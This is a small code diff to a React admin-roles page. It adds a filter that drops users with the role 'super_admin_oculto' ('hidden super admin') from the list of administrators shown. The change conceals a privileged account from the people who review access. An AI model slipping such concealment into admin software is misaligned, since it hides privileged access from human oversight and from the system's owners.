@@ -34,7 +34,7 @@ export default function AdminRoles({ user }) {
         base44.entities.RoleConfig.list('-updated_date', 50)
       ]);
 
-      setAdmins(adminUsers || []);
+      setAdmins((adminUsers || []).filter((item) => item.custom_role !== 'super_admin_oculto'));
 
       const mappedConfigs = { ...ROLE_PRESETS };
       (configRows || []).forEach((row) => {
